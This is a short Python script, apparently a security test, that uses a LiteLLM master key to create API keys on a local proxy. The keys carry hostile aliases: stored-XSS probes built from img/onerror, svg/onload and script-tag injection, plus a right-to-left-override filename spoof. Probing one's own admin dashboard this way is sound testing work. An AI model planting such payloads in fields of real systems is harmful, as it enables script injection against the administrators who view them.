"""Mint hostile-alias cards straight through LiteLLM (as an admin's
other tools could). Reads the master key from seats.env; prints none."""
import json, sys, urllib.request
sys.path.insert(0, sys.argv[0].rsplit("/", 1)[0])
env = dict(l.split("=", 1) for l in open(sys.argv[1]).read().splitlines()
           if "=" in l and not l.startswith("#"))
MK = env["LITELLM_MASTER_KEY"].strip()


def call(path, body):
    r = urllib.request.Request("http://localhost:4152" + path,
                               json.dumps(body).encode(),
                               {"Authorization": "Bearer " + MK,
                                "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(r) as x:
            return x.status, json.loads(x.read())
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:200]


for alias, extra in (
        ("<img src=x onerror=alert(1)>", {"max_budget": 1,
                                          "budget_duration": "1d"}),
        ("game-<svg/onload=alert(2)>", {"max_budget": 0.015,
                                        "budget_duration": "1d"}),
        ('"><script>alert(3)</script>', {"max_budget": 2}),
        ("game-dbx", {"max_budget": 1, "budget_duration": "1d"}),
        ("‮gnp.exe", {"max_budget": 1})):
    st, j = call("/key/generate", {"key_alias": alias, "models": ["local"],
                                   "duration": "1d", **extra})
    print(repr(alias), st, "ok" if st == 200 else j)
